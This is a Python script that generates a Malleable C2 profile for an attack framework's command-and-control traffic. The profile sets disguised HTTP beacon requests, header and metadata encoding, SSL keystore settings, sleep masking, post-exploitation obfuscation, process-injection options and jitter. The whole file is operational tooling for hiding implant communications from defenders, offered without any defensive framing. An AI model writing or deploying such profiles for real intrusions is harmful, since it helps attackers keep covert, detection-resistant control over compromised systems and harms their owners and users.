import json
import os

def load_config(config_file):
    with open(config_file, 'r') as file:
        config = json.load(file)
    return config

def generate_malleable_c2_profile(config):
    profile = f"""
# Malleable C2 Profile
#
# This profile is generated to configure C2 communications with customized HTTP GET/POST requests,
# metadata handling, URI rules, and SSL/TLS configurations.

set host "{config['host']}";

https-certificate {{
    set keystore "{config['keystore']}";
    set password "{config['keystore_password']}";
}}

http-get {{
    set uri {config['uris']};
    
    client {{
        header "Host" "{config['host']}";
        header "User-Agent" "{config['user_agent']}";
        header "Accept" "*/*";
        header "Referer" "http://{config['host']}/";
        metadata {{
            netbios;
            prepend "{config['metadata_prepend']}";
            header "{config['metadata_header']}";
        }}
    }}
    
    server {{
        header "Content-Type" "application/octet-stream";
        header "Connection" "Keep-Alive";
    }}
}}

http-post {{
    set uri "{config['post_uri']}";
    
    client {{
        id {{
            netbios;
        }}
        
        output {{
            {config['output_encoding']};
        }}
    }}
    
    server {{
        header "Content-Type" "application/octet-stream";
        output {{
            {config['output_encoding']};
        }}
    }}
}}

stage {{
    set sleep_mask "true";
    set cleanup "true";
    set userwx "false";
}}

process-inject {{
    set startrwx "false";
    set userwx "false";
}}

post-ex {{
    set obfuscate "true";
    set cleanup "true";
}}

# Sleep and Jitter configuration
set jitter "{config['jitter']}";
set sleeptime "{config['sleep_time']}";
"""

    # Write the profile to a file
    profile_path = f"{config['profile_name']}.profile"
    with open(profile_path, "w") as file:
        file.write(profile)
    
    print(f"Malleable C2 profile generated: {profile_path}")

# Example usage
config_file = "c2_config.json"
config = load_config(config_file)
generate_malleable_c2_profile(config)
